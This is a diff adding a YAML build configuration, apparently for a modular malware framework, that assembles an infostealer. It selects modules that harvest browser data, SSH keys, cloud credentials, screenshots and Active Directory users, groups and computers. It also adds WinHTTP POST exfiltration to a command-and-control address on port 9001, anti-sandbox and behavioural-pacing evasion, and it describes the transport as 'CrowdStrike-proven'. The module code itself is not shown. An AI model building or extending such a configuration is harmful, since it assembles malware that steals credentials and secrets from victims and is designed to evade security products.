@@ -1,0 +1,36 @@
+name: infostealer_ad_http
+description: Full infostealer + AD enumeration with WinHTTP exfil (CrowdStrike-proven transport)
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+  - ad/ldap_client
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/security_products
+  - collectors/env_vars
+  - collectors/browser_chromium
+  - collectors/ssh_keys
+  - collectors/cloud_creds
+  - collectors/screenshot
+  - collectors/ad_domain
+  - collectors/ad_users
+  - collectors/ad_groups
+  - collectors/ad_computers
+  - collectors/ad_gpos
+
+exfil: exfil/winhttp_post
+arch: arch/sequential
+
+resources: true
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
